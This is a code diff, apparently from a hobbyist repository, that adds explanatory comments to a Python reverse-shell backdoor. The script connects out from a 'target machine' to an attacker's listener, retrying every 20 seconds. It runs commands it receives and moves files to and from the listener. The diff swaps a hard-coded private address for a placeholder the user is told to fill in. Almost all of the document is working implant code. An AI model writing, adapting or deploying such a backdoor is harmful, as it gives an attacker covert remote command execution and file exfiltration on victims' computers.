@@ -4,10 +4,12 @@ import subprocess
 import json
 import os
 
+#This function sends data to listener
 def reliable_send(data):
         jsondata = json.dumps(data)
         s.send(jsondata.encode())
 
+#This function recieves data from listener
 def reliable_recv():
         data = ''
         while True:
@@ -17,25 +19,25 @@ def reliable_recv():
                 except ValueError:
                         continue
 
-
-
-
+# This function creates coonection between target machine and listener
 def connection():
 	while True:
-		time.sleep(20)
+		time.sleep(20) #It tries to connect to listener every 20 seconds if it is not connected to listener
 		try:
-			s.connect(('192.168.43.60',5544))
+			s.connect(('IP-Listener',Port)) # You need to change this
 			shell()
 			s.close()
 			break
 		except:
 			connection()
 
+#This function upload files to listener
 def upload_file(file_name):
 	f = open(file_name, 'rb')
 	s.send(f.read())
 
 
+#This function download files from listener
 def download_file(file_name):
         f = open(file_name, 'wb')
         s.settimeout(1)
@@ -49,7 +51,7 @@ def download_file(file_name):
         s.settimeout(None)
         f.close()
 
-
+# This is shell where all the commands are executed
 def shell():
 	while True:
 		command = reliable_recv()
